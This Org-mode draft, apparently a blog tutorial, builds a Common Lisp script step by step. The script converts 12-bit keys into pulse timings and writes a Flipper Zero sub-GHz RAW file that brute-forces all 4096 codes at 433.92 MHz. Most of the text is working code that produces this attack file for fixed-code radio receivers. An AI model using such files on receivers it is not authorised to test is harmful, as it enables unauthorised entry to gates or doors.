#+title: Generating sub-GHz brute-force files for the Flipper Zero (draft)
#+options: num:nil ^:{}

* Generating a brute-force =.sub= file
:PROPERTIES:
:CREATED:  [2024-02-18 Sun 01:00]
:END:

Here we'll be writing a script in [[https://en.wikipedia.org/wiki/Common_Lisp][Common Lisp]], step-by-step. I am not
a strong Lisp programmer, but I just [[file:../themes/lisp.org][love Lisp]] :) The script will be
tailored to our need so I won't bother writing defensive or even clean
code. The script is available on [[https://github.com/alecigne/flipperzero-subghz-bruteforce][GitHub]].

Let's start from our key: 854 in decimal value. It would be nice to
obtain a list of bits from it. We can build this list recursively by
accumulating the remainders of a succession of divisions by 2,
stopping when the integer part is 0. ~floor~ will work since we deal
with positive numbers here:

#+begin_src lisp :results value verbatim :exports both
  (defun int-to-bit-list (n acc)
    (multiple-value-bind (q r) (floor n 2)
      (if (zerop q) (cons r acc) (int-to-bit-list q (cons r acc)))))

  (int-to-bit-list 854 '())
#+end_src

#+RESULTS:
: (1 1 0 1 0 1 0 1 1 0)

It is always nicer to hide the accumulator from the user by using a
local, recursive helper function with ~labels~:

#+begin_src lisp :results value verbatim :exports both
  (defun int-to-bit-list (n)
    (labels ((helper (n acc)
               (multiple-value-bind (q r) (floor n 2)
                 (if (zerop q) (cons r acc) (helper q (cons r acc))))))
      (helper n '())))

  (int-to-bit-list 854)
#+end_src

#+RESULTS:
: (1 1 0 1 0 1 0 1 1 0)

Our result is on 10 bits. We need 12 bits, so let's "prepend" it with
0s. Again, I'll do it recursively, stopping when the list reaches the
desired size:

#+begin_src lisp :results value verbatim :exports both
  (defun prepend (lst &key (elt nil) (final-size 0))
    (let ((current-size (length lst)))
      (if (>= current-size final-size)
          lst
          (prepend (cons elt lst) :elt elt :final-size final-size))))

  (prepend '(a b c) :elt 'x :final-size 5)
#+end_src

#+RESULTS:
: (X X A B C)

Wrapping up:

#+begin_src lisp :results value verbatim :exports both
  (prepend (int-to-bit-list 854) :elt 0 :final-size 12)
#+end_src

#+RESULTS:
: (0 0 1 1 0 1 0 1 0 1 1 0)

Now that we know how to obtain a bit list on 12 bits from a number,
we're going to convert it into a *signal*. A signal will be a list
made of a preamble followed by 12 couples of values depending on the
corresponding source bits. So we'll need two functions:

- ~bit-to-signal~ will convert a single bit to a signal
- ~bit-list-to-signal~ will do it on a bit list, producing a valid
  signal (i.e. preamble + 12 couples of durations):

#+begin_src lisp
  (defun bit-to-signal (bit)
    (cond ((= bit 0) (list -300 600))
          ((= bit 1) (list -600 300))
          (t nil)))

  (defun bit-list-to-signal (bit-list)
    (let ((full-bit-list (prepend bit-list :elt 0 :final-size 12)))
      (append '(-12700 300) (mapcan #'bit-to-signal full-bit-list))))
#+end_src

#+RESULTS:
: BIT-LIST-TO-SIGNAL

I am hardcoding the signal values for this first quick & dirty,
exploratory version. We'll write tests later to pin the behaviour, and
then refactor :)

Let's try out our function:

#+begin_src lisp :results value verbatim :exports both
  (bit-list-to-signal '(1 0 1))
#+end_src

#+RESULTS:
: (-12700 300 -300 600 -300 600 -300 600 -300 600 -300 600 -300 600 -300 600 -300 600 -300 600 -600 300 -300 600 -600 300)

Let's do it for a number by defining ~int-to-signal~:

#+begin_src lisp :results value verbatim :exports both
  (defun int-to-signal (n)
    (bit-list-to-signal (int-to-bit-list n)))

  (int-to-signal 854)
#+end_src

#+RESULTS:
: (-12700 300 -300 600 -300 600 -600 300 -600 300 -300 600 -600 300 -300 600 -600 300 -300 600 -600 300 -600 300 -300 600)

Let's compare that with a signal from our raw file above:

#+begin_example
-12700 300 -300 600 -300 600 -600 300 -600 300 -300 600 -600 300 -300 600 -600 300 -300 600 -600 300 -600 300 -300 600
-12714 319 -316 613 -322 561 -644 277 -618 309 -306 599 -610 277 -299 632 -610 279 -310 601 -612 279 -628 305 -314 571
#+end_example

That looks correct!

Now we'll leave the List Paradise to enter the String Hell -- but hey,
we need a =.sub= file after all!

First we need a function that transforms a signal to a string:

#+begin_src lisp :results value verbatim :exports both
  (defun signal-to-string (sig)
    (format nil "~{~A ~}" sig))

  (signal-to-string (int-to-signal 854))
#+end_src

#+RESULTS:
: "-12700 300 -300 600 -300 600 -600 300 -600 300 -300 600 -600 300 -300 600 -600 300 -300 600 -600 300 -600 300 -300 600 "

I won't detail the ~format~ recipe here, [[https://gigamonkeys.com/book/a-few-format-recipes][Peter Seibel did it better]] in
Practical Common Lisp.

We can now write the ~generate-sub-file~ function that will insert a
header, and then for every key, insert a signal line prefixed with a
=RAW_Data:= string.

#+begin_src lisp
  (defun generate-sub-file (filename &key ((:from start-key)) ((:to end-key)))
    (with-open-file (f filename :direction :output :if-exists :supersede)
      (format f "Filetype: Flipper SubGhz RAW File
  Version: 1
  Frequency: 433920000
  Preset: FuriHalSubGhzPresetOok650Async
  Protocol: RAW~%")
      (loop for key from start-key to end-key do
        (format f "RAW_Data: ~a~%" (signal-to-string (int-to-signal key))))))

  (generate-sub-file "bruteforce.sub" :from 0 :to 4095)
#+end_src

Voilà! Again, the script is available on [[https://github.com/alecigne/flipperzero-subghz-bruteforce][GitHub]].

